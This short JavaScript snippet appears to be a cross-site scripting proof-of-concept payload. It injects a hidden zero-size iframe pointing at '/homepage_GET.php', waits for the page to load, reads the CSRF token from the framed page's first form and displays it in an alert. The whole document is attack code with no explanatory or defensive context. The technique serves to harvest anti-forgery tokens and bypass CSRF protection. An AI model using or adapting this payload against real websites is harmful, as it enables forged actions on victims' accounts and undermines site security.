function read() {
 alert(document.getElementById("iframe").contentDocument.forms[0].csrf.value);
}


document.writeln('<iframe id="iframe" src="/homepage_GET.php?" width="0" height="0" onload="read()"> </iframe>');